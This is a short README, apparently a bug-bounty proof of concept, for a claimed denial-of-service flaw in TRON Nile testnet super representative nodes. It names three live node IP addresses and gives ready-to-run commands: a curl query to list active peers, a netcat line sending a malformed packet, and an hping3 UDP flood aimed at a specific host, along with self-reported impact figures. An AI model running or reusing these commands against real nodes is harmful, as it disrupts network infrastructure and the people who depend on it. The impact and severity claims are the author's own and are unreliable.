# Mr Tron Recon 🚀

**TRON Nile SR DoS PoC** - HackerOne #3676543 ($25-75k pipeline)

## Live Impact (2026-04-15)
- **3 SRs accept malformed BAD_BLOCK**: 3.137.0.94:18888, 199.231.235.35:18888, 159.195.146.87:18888
- **60s hping3 flood**: 24,510 packets → 100% loss (SR consumed)
- **Source chain**: PeerConnection.BAD_BLOCK:170 → SyncService.disconnect() → consensus stall

## Repro
```bash
# SR discovery
curl -s nile.trongrid.io/wallet/getnodeinfo | jq -r '.peerList[] | select(.active==true) | .host + ":" + (.port|tostring)'

# Malformed test
printf '\x12\x03BAD\x10\x01' | nc -u 3.137.0.94 18888  # ACCEPTED

# Flood
sudo hping3 -2 --flood -p 18888 --data 120342030244410101 3.137.0.94
```

**CVSS 9.6 CRITICAL** - 27 SRs flooded = DPoS halt

[PoC Video](hping3-2026-04-15_22.16.29.mp4)
